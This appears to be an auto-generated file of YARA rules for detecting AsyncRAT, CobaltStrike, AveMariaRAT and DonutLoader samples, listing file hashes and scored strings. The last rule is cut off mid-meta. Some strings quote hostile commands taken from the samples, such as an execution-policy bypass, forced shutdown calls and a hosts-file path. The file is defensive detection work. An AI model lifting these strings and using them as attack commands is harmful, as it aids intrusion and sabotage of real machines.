rule _AsyncRAT_signature__f5e04aff_c9be022270b7bbb350f84e6fac1daf45e508171760c01cfc79349ef572dc1b70_c9be0222_74 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature)_f5e04aff.js, c9be022270b7bbb350f84e6fac1daf45e508171760c01cfc79349ef572dc1b70_c9be0222.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f5e04aff039c45f4613c8dd171d28625cf902834e20174154145ac2fac3add33"
      hash2 = "c9be022270b7bbb350f84e6fac1daf45e508171760c01cfc79349ef572dc1b70"
   strings:
      $s1 = "// Process file list" fullword ascii /* score: '15.00'*/
      $s2 = "+ e.description);" fullword ascii /* score: '14.00'*/
      $s3 = "WScript.Sleep(500);" fullword ascii /* score: '13.00'*/
      $s4 = "if ( WScript.Arguments.length < 1 || WScript.Arguments.Named.Exists('H') ) {" fullword ascii /* score: '10.00'*/
      $s5 = "if ( WScript.Arguments.Named.Exists('F') ) {" fullword ascii /* score: '10.00'*/
      $s6 = "// ReadOnlyRecommended" fullword ascii /* score: '10.00'*/
      $s7 = "if ( WScript.Arguments.Named.Exists('XSL') ) {" fullword ascii /* score: '10.00'*/
      $s8 = " * Copyright (c) 2004-2020 Ildar Shaimordanov" fullword ascii /* score: '10.00'*/
      $s9 = "if ( WScript.Arguments.Named.Exists('fg') ) {" fullword ascii /* score: '10.00'*/
      $s10 = "// CompatibilityMode" fullword ascii /* score: '9.00'*/
      $s11 = "+ '] - ' " fullword ascii /* score: '9.00'*/
      $s12 = "+ (e.number & 0xFFFF) " fullword ascii /* score: '8.00'*/
      $s13 = "// /F:FB2 /XSL:filename" fullword ascii /* score: '8.00'*/
      $s14 = "// /F:TXT /E:Encoding" fullword ascii /* score: '8.00'*/
      $s15 = "// /F:TXT /L:lineending" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _CobaltStrike_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__CobaltStrike_signature__d42595b695fc008ef2c56aabd8efd68e__75 {
   meta:
      description = "_subset_batch - from files CobaltStrike(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4390de792c33fb358e49444f5c40349d2f0929ccf1820b98bc4c29cd08ef475c"
      hash2 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash3 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash4 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash5 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash6 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash7 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash8 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash9 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
   strings:
      $s1 = "os.commandLineToArgv" fullword ascii /* score: '16.00'*/
      $s2 = "readbyte" fullword ascii /* score: '11.00'*/
      $s3 = "syscall.GetCommandLine" fullword ascii /* score: '11.00'*/
      $s4 = "*poll.operation" fullword ascii /* score: '9.00'*/
      $s5 = "os.getModuleFileName" fullword ascii /* score: '9.00'*/
      $s6 = "lastbits" fullword ascii /* score: '8.00'*/
      $s7 = "readuint16" fullword ascii /* score: '8.00'*/
      $s8 = "syscall.GetConsoleMode" fullword ascii /* score: '8.00'*/
      $s9 = "*windows.WSAMsg" fullword ascii /* score: '8.00'*/
      $s10 = "syscall.GetFileType" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( all of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0a666367_AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_76 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0a666367.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_32d46f1e.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3e5b53f8.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6a591372.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8dd89606.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a3ffac3f.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d0aa85ea.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d37e3928.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e5a3a745.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0a666367b565edb99e6b1873e7ecb238a6926b0bd722e87eb7ceba4136470d06"
      hash2 = "32d46f1ec65b792fcdaa715c3fe663f27a64552b2caabacde0ffca74892e4efa"
      hash3 = "3e5b53f8b01e9eaf54c9879fc832f3f71e6b078b6f4cacc93cad05e2a2ff031e"
      hash4 = "6a5913726bb21bbd8fe5b2ea02663a5638b576bca82ba87e29158091b619cc93"
      hash5 = "8dd89606177de6163e4b76893a6185ece0ecb5ad4a4ddce8728b51a67de73295"
      hash6 = "a3ffac3fec0bcd459419c862771088b3456672a9139b04515a689bfef0417901"
      hash7 = "d0aa85eae275525c3634f42f2a50142250651dc209ae7e36c8b12d8a42770192"
      hash8 = "d37e3928a676a9ff21c7b1b215e272447478bdd99ef03035edc2f0f7105d9733"
      hash9 = "e5a3a745a69ce661f65a5c3cd1d40871a3afbf6b4a27326676f70961b0e26d11"
   strings:
      $x1 = "-ExecutionPolicy Bypass -File \"" fullword wide /* score: '31.00'*/
      $s2 = "shutdown.exe /f /s /t 0" fullword wide /* score: '22.00'*/
      $s3 = "shutdown.exe /f /r /t 0" fullword wide /* score: '22.00'*/
      $s4 = "shutdown.exe -L" fullword wide /* score: '18.00'*/
      $s5 = "Win32_Processor.deviceid=\"CPU0\"" fullword wide /* score: '15.00'*/
      $s6 = "\\drivers\\etc\\hosts" fullword wide /* score: '13.00'*/
      $s7 = "PCLogoff" fullword wide /* score: '9.00'*/
      $s8 = "RunShell" fullword wide /* score: '9.00'*/
      $s9 = "HostsMSG" fullword wide /* score: '9.00'*/
      $s10 = "HostsErr" fullword wide /* score: '9.00'*/
      $s11 = "OfflineGet" fullword wide /* score: '9.00'*/
      $s12 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" fullword wide /* score: '9.00'*/
      $s13 = "$VB$Local_Host" fullword ascii /* score: '8.00'*/
      $s14 = "Shosts" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_d42595b695fc008ef2c56aabd8efd68e_imphash__c95056c_77 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe, dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed_dd56a47d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
      hash3 = "dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed"
   strings:
      $s1 = "type:.eq.log.Logger" fullword ascii /* score: '21.00'*/
      $s2 = "log.getBuffer" fullword ascii /* score: '17.00'*/
      $s3 = "log.formatHeader" fullword ascii /* score: '17.00'*/
      $s4 = "*log.Logger" fullword ascii /* score: '15.00'*/
      $s5 = "log.(*Logger).output" fullword ascii /* score: '14.00'*/
      $s6 = "log.(*Logger).SetFlags" fullword ascii /* score: '14.00'*/
      $s7 = "log.(*Logger).Prefix" fullword ascii /* score: '14.00'*/
      $s8 = "log.(*Logger).SetPrefix" fullword ascii /* score: '14.00'*/
      $s9 = "log.(*Logger).SetOutput" fullword ascii /* score: '14.00'*/
      $s10 = "log.(*Logger).Flags" fullword ascii /* score: '14.00'*/
      $s11 = "log.New" fullword ascii /* score: '12.00'*/
      $s12 = "log.init.0.func1" fullword ascii /* score: '12.00'*/
      $s13 = "log.putBuffer" fullword ascii /* score: '12.00'*/
      $s14 = "log.init.0.func1.1" fullword ascii /* score: '12.00'*/
      $s15 = "log.itoa" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _AveMariaRAT_signature__346c9b88ded843c92a3b0721fedbbd3d_imphash__AveMariaRAT_signature__c149ad8b73121762d33844ffa5c7ca51_im_78 {
   meta:
      description = "_subset_batch - from files AveMariaRAT(signature)_346c9b88ded843c92a3b0721fedbbd3d(imphash).exe, AveMariaRAT(signature)_c149ad8b73121762d33844ffa5c7ca51(imphash).exe, b069d88b33e75313d6c2f825eb1f4188(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5066c7ce14b8a3cc419d9a3211b1e13e22b6376f8cec8c91f23767830de6a869"
      hash2 = "a868126d10484d16bad327ab13861c0a479a7d809a567d8623cf720d2c31022d"
      hash3 = "f33b9f92f7844ac3e037328500c492c231ad480658f63f5a3f306d4899b1509d"
   strings:
      $s1 = "BResolveGenericVirtualMethodTargetBGetStringFromMemoryInNativeFormatDGetRuntimeFieldHandleForComponents@" fullword ascii /* score: '20.00'*/
      $s2 = "2WriteProcessMemory_Native" fullword ascii /* score: '15.00'*/
      $s3 = "*CreateProcessW_Native" fullword ascii /* score: '15.00'*/
      $s4 = "RTryGetStaticRuntimeMethodHandleComponentsRGetMethodDescForStaticRuntimeMethodHandle@" fullword ascii /* score: '15.00'*/
      $s5 = "relaxations CompilerServices" fullword ascii /* score: '12.00'*/
      $s6 = "System.Numerics.INumberBase<System.Int32>.TryConvertFromSaturating" fullword ascii /* score: '10.00'*/
      $s7 = "System.Numerics.INumberBase<System.Int32>.TryConvertToSaturating" fullword ascii /* score: '10.00'*/
      $s8 = "\"GetArgumentString" fullword ascii /* score: '9.00'*/
      $s9 = "4TryGetMetadataForNamedType" fullword ascii /* score: '9.00'*/
      $s10 = "FTryGetStaticGenericMethodDictionary" fullword ascii /* score: '9.00'*/
      $s11 = "HTryGetDynamicGenericMethodDictionary@" fullword ascii /* score: '9.00'*/
      $s12 = " ThrowInvalidBase FromBase64String" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__c9391c4d011b74463c0b80c8ef62af14_imphash__be40317f77365bdf4dbd1877eee6bf25_imphash__c9391c4d011b74463c0_79 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature)_c9391c4d011b74463c0b80c8ef62af14(imphash).exe, be40317f77365bdf4dbd1877eee6bf25(imphash).exe, c9391c4d011b74463c0b80c8ef62af14(imphash).exe, c9391c4d011b74463c0b80c8ef62af14(imphash)_3ba94639.exe, CoinMiner(signature)_c9391c4d011b74463c0b80c8ef62af14(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6261725cc075d343f4a875f0546732d9b9de811efbc5a26bc6fdc62c1d43cf62"
      hash2 = "4c085cb79516494946428cc4466f0df1b55caeb3c394a78c6af735231b1288d3"
      hash3 = "206fe9878d077f974e0f671e74833a90eb766dc94dc42ccbe51aa488dea250c0"
      hash4 = "3ba94639dc0aa7c1262a353364762500084051bda74fe26b8dbec2c143ed7001"
      hash5 = "f012a0de986e9b90a60333e4473cac7fbba3fee99f1709c549356a9f63ce7305"
   strings:
      $s1 = "  Ctrl+Alt+R  -> Recycle Documents\\AutoProx\\temp.txt" fullword wide /* score: '22.00'*/
      $s2 = "[HK] Recycled temp.txt" fullword wide /* score: '18.00'*/
      $s3 = "[i] Privilege %s not present in token (ok)." fullword wide /* score: '14.00'*/
      $s4 = "EventLog hotkeys started" fullword wide /* score: '12.00'*/
      $s5 = "CreateFileW(temp)" fullword wide /* score: '11.00'*/
      $s6 = "AutoProx temp file." fullword wide /* score: '11.00'*/
      $s7 = "[HK] Recycle failed" fullword wide /* score: '10.00'*/
      $s8 = "AutoProx Hotkeys running." fullword wide /* score: '10.00'*/
      $s9 = "[OK] Privilege %s enabled." fullword wide /* score: '10.00'*/
      $s10 = "[!] Some hotkeys failed. Try closing apps that use Ctrl+Alt+U/O/R/L." fullword wide /* score: '10.00'*/
      $s11 = "ENDSESSION" fullword wide /* score: '9.50'*/
      $s12 = "SHFileOperationW(FO_DELETE)" fullword wide /* score: '9.00'*/
      $s13 = "  Ctrl+Alt+O  -> Open Documents folder" fullword wide /* score: '8.00'*/
      $s14 = "  Ctrl+Alt+L  -> Lock workstation" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 8 of them )
      ) or ( all of them )
}

rule _bae16c755f147042d7820ee97fb519b9_imphash__DonutLoader_signature__492a5d3560401c2811de048088bf91d0_imphash__DonutLoader_sign_80 {
   meta:
      description = "_subset_batch - from files bae16c755f147042d7820ee97fb519b9(imphash).exe, DonutLoader(signature)_492a5d3560401c2811de048088bf91d0(imphash).exe, DonutLoader(signature)_492a5d3560401c2811de048088bf91d0(imphash)_4e4a3751.exe, DonutLoader(signature)_492a5d3560401c2811de048088bf91d0(imphash)_76889ef2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0f680169d5eaab7cebda7b323c59518b31d70efe2a8a1b759f0698d5f918dd9d"
      hash2 = "7c74d74c6d6a4ffc724a7800ddf18e165e582e2e4b0aace1b5266ec3d25a9775"
      hash3 = "4e4a3751581252e210f6f45881d778d1f482146f92dc790504bfbcd2bdfa0129"
      hash4 = "76889ef23dc327c0a63da2e296e079ce1f6844da185c3160402341557e6bccfa"
   strings:
      $s1 = "Ehttp://www.ssl.com/repository/SSLcomRootCertificationAuthorityRSA.crt0 " fullword ascii /* score: '19.00'*/
      $s2 = "http://ocsps.ssl.com0P" fullword ascii /* score: '17.00'*/
      $s3 = "!SSL.com Timestamping Unit 2024 E10Y0" fullword ascii /* score: '17.00'*/
      $s4 = "http://ocsps.ssl.com0?" fullword ascii /* score: '17.00'*/
      $s5 = "5http://cert.ssl.com/SSL.com-timeStamping-I-RSA-R1.cer0Q" fullword ascii /* score: '17.00'*/
      $s6 = ".SSL.com EV Root Certification Authority RSA R20" fullword ascii /* score: '16.00'*/
      $s7 = ">http://www.ssl.com/repository/SSLcom-RootCA-EV-RSA-4096-R2.crt0 " fullword ascii /* score: '16.00'*/
      $s8 = "4http://crls.ssl.com/SSLcom-RootCA-EV-RSA-4096-R2.crl0" fullword ascii /* score: '16.00'*/
      $s9 = "&SSL.com Timestamping Issuing RSA CA R10" fullword ascii /* score: '13.00'*/
      $s10 = "&SSL.com Timestamping Issuing RSA CA R1" fullword ascii /* score: '13.00'*/
      $s11 = "5http://crls.ssl.com/SSL.com-timeStamping-I-RSA-R1.crl0" fullword ascii /* score: '13.00'*/
      $s12 = "?http://cert.ssl.com/SSLcom-SubCA-EV-CodeSigning-RSA-4096-R3.cer0 " fullword ascii /* score: '13.00'*/
      $s13 = "?http://crls.ssl.com/SSLcom-SubCA-EV-CodeSigning-RSA-4096-R3.crl0" fullword ascii /* score: '13.00'*/
      $s14 = ".SSL.com EV Code Signing Intermediate CA RSA R30" fullword ascii /* score: '12.00'*/
      $s15 = ".SSL.com EV Code Signing Intermediate CA RSA R3" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _d42595b695fc008ef2c56aabd8efd68e_imphash__4970e957_d42595b695fc008ef2c56aabd8efd68e_imphash__634ff4b4_d42595b695fc008ef2c56_81 {
   meta:
      description = "_subset_batch - from files d42595b695fc008ef2c56aabd8efd68e(imphash)_4970e957.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_634ff4b4.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7ed53caf.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_9d83c505.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_f8818a24.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4970e95727c983c9fc09673db8e3a852c135fdcb74c60ce8b927808eb767f115"
      hash2 = "634ff4b4130189a88f970b2ee8c14109f52b20b51cef431bd4c65e9023a704c1"
      hash3 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash4 = "7ed53cafeb7ec84dbcd378cb16d732466ba9d3ed83a97c4b4a4dbd7ab7efe345"
      hash5 = "9d83c5056348b6a80c16232a49050485d3917ba93f1310921a9e7e4666142cf7"
      hash6 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
      hash7 = "f8818a247bfdfd7017a4c57867dc9f4f0ff9a59c792ad2c5652551a695b1a9a6"
   strings:
      $s1 = "areForSweep; sweepgen /cpu/classes/total:cpu-seconds/gc/cycles/automatic:gc-cycles/sched/pauses/total/gc:seconds/sync/mutex/wait" ascii /* score: '20.00'*/
      $s2 = " s.sweepgen= allocCount ProcessPrng" fullword ascii /* score: '20.00'*/
      $s3 = "runtime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-" ascii /* score: '18.00'*/
      $s4 = "system huge page size (runtime: s.allocCount= s.allocCount > s.nelems/gc/heap/allocs:objectsmissing type in runfinqruntime: inte" ascii /* score: '15.00'*/
      $s5 = "bindm in unexpected GOOSruntime: mp.lockedInt = runqsteal: runq overflowunexpected syncgroup setdouble traceGCSweepStartbad use " ascii /* score: '15.00'*/
      $s6 = "/total:seconds/godebug/non-default-behavior/bcryptprimitives.dll not foundpanic called with nil argumentcheckdead: inconsistent " ascii /* score: '12.00'*/
      $s7 = "tualAlloc of /sched/gomaxprocs:threadsremaining pointer buffersslice bounds out of range_cgo_thread_start missingallgadd: bad st" ascii /* score: '11.00'*/
      $s8 = "runtime.traceClockUnitsPerSecond" fullword ascii /* score: '10.00'*/
      $s9 = "stopm spinning nmidlelocked= needspinning=randinit twicestore64 failedsemaRoot queuebad allocCountbad span statestack overflow u" ascii /* score: '10.00'*/
      $s10 = " (scan  MB in pacer: % CPU ( zombie, j0 = head = panic:  nmsys= locks= dying= allocsGODEBUG m->g0= pad1=  pad2=  text= minpc= " fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( all of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_CobaltStrike_signature__9cbefe68f395e67356e2a5d8d_82 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, CobaltStrike(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_4970e957.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_634ff4b4.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7ed53caf.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_9d83c505.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_f8818a24.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "4390de792c33fb358e49444f5c40349d2f0929ccf1820b98bc4c29cd08ef475c"
      hash3 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash4 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash5 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash6 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash7 = "4970e95727c983c9fc09673db8e3a852c135fdcb74c60ce8b927808eb767f115"
      hash8 = "634ff4b4130189a88f970b2ee8c14109f52b20b51cef431bd4c65e9023a704c1"
      hash9 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash10 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash11 = "7ed53cafeb7ec84dbcd378cb16d732466ba9d3ed83a97c4b4a4dbd7ab7efe345"
      hash12 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash13 = "9d83c5056348b6a80c16232a49050485d3917ba93f1310921a9e7e4666142cf7"
      hash14 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
      hash15 = "f8818a247bfdfd7017a4c57867dc9f4f0ff9a59c792ad2c5652551a695b1a9a6"
   strings:
      $s1 = "runtime.makeHeadTailIndex" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.memhash128" fullword ascii /* score: '13.00'*/
      $s3 = "runtime.mix" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.(*pageAlloc).sysGrow.func1" fullword ascii /* score: '11.00'*/
      $s5 = "runtime.(*pageAlloc).sysGrow.func3" fullword ascii /* score: '11.00'*/
      $s6 = "runtime.(*pageAlloc).sysGrow.func2" fullword ascii /* score: '11.00'*/
      $s7 = "runtime.duffzero" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.init.6" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.duffcopy" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.chunkIdx.l1" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.chunkIdx.l2" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.block" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.addrRange.subtract" fullword ascii /* score: '10.00'*/
      $s14 = "waitsema" fullword ascii /* score: '8.00'*/
      $s15 = "cmpbody" fullword ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b_83 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash3 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash4 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash5 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash6 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash7 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash8 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
   strings:
      $s1 = "slices.partitionEqualOrdered[go.shape.int]" fullword ascii /* score: '10.00'*/
      $s2 = "slices.partialInsertionSortOrdered[go.shape.int]" fullword ascii /* score: '10.00'*/
      $s3 = "slices.medianAdjacentOrdered[go.shape.int]" fullword ascii /* score: '10.00'*/
      $s4 = "slices.Sort[go.shape.[]int,go.shape.int]" fullword ascii /* score: '10.00'*/
      $s5 = "slices.insertionSortOrdered[go.shape.int]" fullword ascii /* score: '10.00'*/
      $s6 = "slices.reverseRangeOrdered[go.shape.int]" fullword ascii /* score: '10.00'*/
      $s7 = "slices.order2Ordered[go.shape.int]" fullword ascii /* score: '10.00'*/
      $s8 = "cmp.Less[go.shape.int]" fullword ascii /* score: '10.00'*/
      $s9 = "slices.partitionOrdered[go.shape.int]" fullword ascii /* score: '10.00'*/
      $s10 = "slices.siftDownOrdered[go.shape.int]" fullword ascii /* score: '10.00'*/
      $s11 = "slices.breakPatternsOrdered[go.shape.int]" fullword ascii /* score: '10.00'*/
      $s12 = "slices.pdqsortOrdered[go.shape.int]" fullword ascii /* score: '10.00'*/
      $s13 = "slices.medianOrdered[go.shape.int]" fullword ascii /* score: '10.00'*/
      $s14 = "slices.choosePivotOrdered[go.shape.int]" fullword ascii /* score: '10.00'*/
      $s15 = "slices.heapSortOrdered[go.shape.int]" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_CobaltStrike_signature__9cbefe68f395e67356e2a5d8d_84 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, CobaltStrike(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_4970e957.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_634ff4b4.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7ed53caf.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_9d83c505.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_f8818a24.exe, dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed_dd56a47d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "4390de792c33fb358e49444f5c40349d2f0929ccf1820b98bc4c29cd08ef475c"
      hash3 = "4970e95727c983c9fc09673db8e3a852c135fdcb74c60ce8b927808eb767f115"
      hash4 = "634ff4b4130189a88f970b2ee8c14109f52b20b51cef431bd4c65e9023a704c1"
      hash5 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash6 = "7ed53cafeb7ec84dbcd378cb16d732466ba9d3ed83a97c4b4a4dbd7ab7efe345"
      hash7 = "9d83c5056348b6a80c16232a49050485d3917ba93f1310921a9e7e4666142cf7"
      hash8 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
      hash9 = "f8818a247bfdfd7017a4c57867dc9f4f0ff9a59c792ad2c5652551a695b1a9a6"
